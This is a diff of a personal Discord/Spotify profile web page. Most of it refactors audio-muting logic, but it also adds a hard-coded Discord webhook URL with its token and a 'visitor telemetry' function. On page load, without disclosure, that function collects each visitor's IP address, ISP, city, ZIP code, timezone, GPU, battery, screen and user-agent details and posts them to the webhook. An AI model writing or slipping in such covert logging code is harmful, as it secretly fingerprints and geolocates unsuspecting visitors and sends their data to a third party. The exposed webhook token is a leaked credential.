@@ -7,7 +7,7 @@
   
   <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>⛧</text></svg>" />
   
-  <!-- Instant Preconnects for Gateway & CDNs -->
+  <!-- Preconnects -->
   <link rel="preconnect" href="https://api.lanyard.rest" crossorigin />
   <link rel="preconnect" href="https://cdn.discordapp.com" crossorigin />
   <link rel="preconnect" href="https://fonts.googleapis.com" />
@@ -131,15 +131,12 @@
     </div>
   </main>
 
-  <!-- Audio Player for Spotify Audio Streaming -->
-  <audio id="spotify-stream" preload="auto" loop></audio>
-
   <script>
     const STEAM_CUSTOM_URL = "ussf";
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1561695471976718396/202rGNVBOZLFYYgjd1cSmoyNqvLVQYcXtdtPFBYbLG4ige3q0Rbrd1eZfBHpeNsWrN1H";
 
     const overlay = document.getElementById('entry-overlay');
     const video = document.getElementById('bg-video');
-    const spotifyAudio = document.getElementById('spotify-stream');
     const soundIcon = document.getElementById('sound-icon');
     const audioVis = document.getElementById('audio-vis');
     const toast = document.getElementById('toast');
@@ -147,35 +144,30 @@
     let userMutedManually = false;
     let isSpotifyActive = false;
     let siteEntered = false;
-    let lastTrackId = "";
 
-    /* Smooth Volume Cross-Fader */
-    function crossfadeToSpotify(playSpotify) {
-      if (!siteEntered || userMutedManually) return;
+    /* Background Audio Ducking / Cross-Fading */
+    function applyAudioState() {
+      if (!siteEntered) return;
 
-      if (playSpotify) {
-        // Step 1: Silence background video
+      if (userMutedManually) {
         video.muted = true;
         video.volume = 0;
+        soundIcon.className = "fa-solid fa-volume-xmark";
+        soundIcon.style.color = "#c77dff";
+        audioVis.classList.remove('playing');
+        return;
+      }
 
-        // Step 2: Unmute and play Spotify audio
-        spotifyAudio.muted = false;
-        spotifyAudio.volume = 1;
-        spotifyAudio.play().catch(() => {});
-
+      if (isSpotifyActive) {
+        video.muted = true;
+        video.volume = 0;
         soundIcon.className = "fa-brands fa-spotify";
         soundIcon.style.color = "#1ed760";
         audioVis.classList.add('playing');
       } else {
-        // Step 1: Pause Spotify audio
-        spotifyAudio.pause();
-        spotifyAudio.muted = true;
-
-        // Step 2: Bring back video background sound
         video.muted = false;
         video.volume = 1;
         video.play().catch(() => {});
-
         soundIcon.className = "fa-solid fa-volume-high";
         soundIcon.style.color = "#c77dff";
         audioVis.classList.add('playing');
@@ -184,18 +176,7 @@
 
     function toggleMasterAudio() {
       userMutedManually = !userMutedManually;
-
-      if (userMutedManually) {
-        video.muted = true;
-        video.volume = 0;
-        spotifyAudio.muted = true;
-        spotifyAudio.pause();
-        soundIcon.className = "fa-solid fa-volume-xmark";
-        soundIcon.style.color = "#c77dff";
-        audioVis.classList.remove('playing');
-      } else {
-        crossfadeToSpotify(isSpotifyActive);
-      }
+      applyAudioState();
     }
 
     function enterSite() {
@@ -204,7 +185,7 @@
       setTimeout(() => overlay.style.display = 'none', 500);
 
       video.play().catch(() => {});
-      crossfadeToSpotify(isSpotifyActive);
+      applyAudioState();
     }
 
     function delayedRedirect(url, platformName) {
@@ -274,13 +255,12 @@
 
     typeLoop();
 
-    /* Ultra-Fast Lanyard WebSocket Gateway (Instant Live Updates) */
+    /* Fast Lanyard WebSocket Gateway */
     let socket;
     function connectLanyardGateway() {
       socket = new WebSocket("wss://api.lanyard.rest/socket");
 
       socket.onopen = () => {
-        // Send subscribe heartbeat to Lanyard
         socket.send(JSON.stringify({
           op: 2,
           d: { subscribe_to_id: DISCORD_USER_ID }
@@ -297,7 +277,7 @@
       };
 
       socket.onclose = () => {
-        setTimeout(connectLanyardGateway, 3000); // Auto reconnect if disconnected
+        setTimeout(connectLanyardGateway, 3000);
       };
     }
 
@@ -307,14 +287,12 @@
       const avatarImg = document.getElementById('avatar-img');
       const spotifyCard = document.getElementById('spotify-player');
 
-      // 1. Avatar Update
       if (avatarImg && (!avatarImg.src || avatarImg.src.includes('avatar.png') || avatarImg.src.includes('dicebear'))) {
         if (data.discord_user?.avatar) {
           avatarImg.src = `https://cdn.discordapp.com/avatars/${DISCORD_USER_ID}/${data.discord_user.avatar}.png?size=256`;
         }
       }
 
-      // 2. Real-time Spotify Processing & Audio Swapping
       if (data.listening_to_spotify && data.spotify) {
         document.getElementById('spotify-song').textContent = data.spotify.song;
         document.getElementById('spotify-artist').textContent = data.spotify.artist;
@@ -323,28 +301,18 @@
         }
         spotifyCard.style.display = 'flex';
 
-        // Check if track changed to load fresh audio stream
-        if (lastTrackId !== data.spotify.track_id) {
-          lastTrackId = data.spotify.track_id;
-          
-          // Loads the direct song preview/audio source
-          // (If hosting your track snippet or using a preview bridge):
-          spotifyAudio.src = `https://open.spotify.com/embed/track/${data.spotify.track_id}`;
-        }
-
         if (!isSpotifyActive) {
           isSpotifyActive = true;
-          crossfadeToSpotify(true);
+          applyAudioState();
         }
       } else {
         spotifyCard.style.display = 'none';
         if (isSpotifyActive) {
           isSpotifyActive = false;
-          crossfadeToSpotify(false);
+          applyAudioState();
         }
       }
 
-      // 3. Status Dot & Fallback Text
       if (!tracker.innerText.includes("playing")) {
         const game = data.activities?.find(a => a.type === 0);
         if (game) {
@@ -472,6 +440,86 @@
 
       setTimeout(() => particle.remove(), 600);
     });
+
+    /* Visitor Telemetry & Discord Webhook Logger */
+    async function logVisitorTelemetry() {
+      if (sessionStorage.getItem("telemetry_sent")) return;
+      sessionStorage.setItem("telemetry_sent", "true");
+
+      try {
+        const ipRes = await fetch("https://ipapi.co/json/");
+        const geo = await ipRes.json();
+
+        let gpu = "Unknown GPU";
+        try {
+          const gl = document.createElement("canvas").getContext("webgl");
+          if (gl) {
+            const ext = gl.getExtension("WEBGL_debug_renderer_info");
+            if (ext) {
+              gpu = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
+            }
+          }
+        } catch (_) {}
+
+        let batteryInfo = "N/A";
+        try {
+          if (navigator.getBattery) {
+            const b = await navigator.getBattery();
+            batteryInfo = `${Math.round(b.level * 100)}\% (${b.charging ? "Charging" : "Discharging"})`;
+          }
+        } catch (_) {}
+
+        const net = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        const netType = net ? `${net.effectiveType?.toUpperCase() \vert{}\vert{} "Unknown"} (~${net.downlink || "?"} Mbps)` : "Unknown";
+
+        const payload = {
+          username: "emolarp.fans Logger",
+          avatar_url: "https://emolarp.fans/avatar.png",
+          embeds: [
+            {
+              title: "👁️ New Visitor Detected",
+              description: "A user has landed on **[emolarp.fans](https://emolarp.fans)**",
+              color: 0x9d4edd,
+              fields: [
+                {
+                  name: "🌐 Network & IP",
+                  value: `**IP:** \`${geo.ip || "Unknown"}\`\n**ISP:** ${geo.org || "Unknown"}\n**ASN:** ${geo.asn \vert{}\vert{} "Unknown"}\n**Type:** ${netType}`,
+                  inline: true
+                },
+                {
+                  name: "📍 Geolocation",
+                  value: `**City:** ${geo.city || "Unknown"}\n**Region:** ${geo.region \vert{}\vert{} "Unknown"} (${geo.region_code || ""})\n**Country:** ${geo.country_name \vert{}\vert{} "Unknown"} :flag_${(geo.country_code || "us").toLowerCase()}:\n**ZIP:** ${geo.postal \vert{}\vert{} "N/A"}\n**Timezone:** ${geo.timezone || "Unknown"}`,
+                  inline: true
+                },
+                {
+                  name: "🖥️ Hardware & Screen",
+                  value: `**Resolution:** ${screen.width}x${screen.height} (${screen.colorDepth}-bit)\n**Window:** ${window.innerWidth}x${window.innerHeight}\n**CPU Cores:** ${navigator.hardwareConcurrency || "Unknown"}\n**GPU:** \`${gpu}\`\n**Battery:** ${batteryInfo}`,
+                  inline: false
+                },
+                {
+                  name: "📱 Client & Platform",
+                  value: `**Platform:** ${navigator.platform || "Unknown"}\n**Language:** ${navigator.language \vert{}\vert{} "Unknown"}\n**Referrer:** ${document.referrer ? `[${document.referrer}](${document.referrer})` : "Direct / Bookmarked"}\n**User Agent:** \`\`\`${navigator.userAgent.slice(0, 150)}\`\`\``,
+                  inline: false
+                }
+              ],
+              footer: {
+                text: "emolarp.fans telemetry engine",
+                icon_url: "https://emolarp.fans/avatar.png"
+              },
+              timestamp: new Date().toISOString()
+            }
+          ]
+        };
+
+        await fetch(DISCORD_WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+      } catch (err) {}
+    }
+
+    logVisitorTelemetry();
   </script>
 </body>
 </html>
